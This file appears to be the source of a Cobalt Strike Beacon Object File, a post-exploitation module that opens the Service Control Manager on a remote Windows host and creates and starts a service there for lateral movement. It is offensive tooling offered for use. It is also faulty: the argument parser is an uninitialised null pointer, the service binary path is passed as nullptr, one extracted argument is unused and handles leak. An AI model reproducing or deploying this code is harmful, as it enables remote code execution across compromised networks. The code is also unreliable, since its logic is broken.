#include <Externs.hpp>
#include <Common.hpp>

auto RmtSvcCreate( 
    _In_ PCHAR Host,
    _In_ PCHAR SvcName,
    _In_ PCHAR SvcPath
) -> VOID {
    SC_HANDLE ScHandle  = NULL;
    SC_HANDLE SvcHandle = NULL;

    ScHandle = OpenSCManagerA( Host, nullptr, SC_MANAGER_ALL_ACCESS );
    if ( !ScHandle ) return;

    SvcHandle = CreateServiceA( 
        ScHandle, SvcName, nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, nullptr, nullptr, 0, nullptr, nullptr, nullptr 
    );
    if ( !SvcHandle ) return;

    if ( StartServiceA( SvcHandle, 0, nullptr ) ) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started!");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[x] Service failed with error: %d", GetLastError());
    }
}

auto go(PCHAR Args, INT Argc) -> void {
    Start();

    Data* Parser = { 0 };

    PCHAR Host    = BeaconDataExtract( Parser, 0 );
    PCHAR SvcName = BeaconDataExtract( Parser, 0 );
    PCHAR SvcPath = BeaconDataExtract( Parser, 0 );
    PCHAR BinPath = BeaconDataExtract( Parser, 0 );

    RmtSvcCreate( Host, SvcName, SvcPath );
}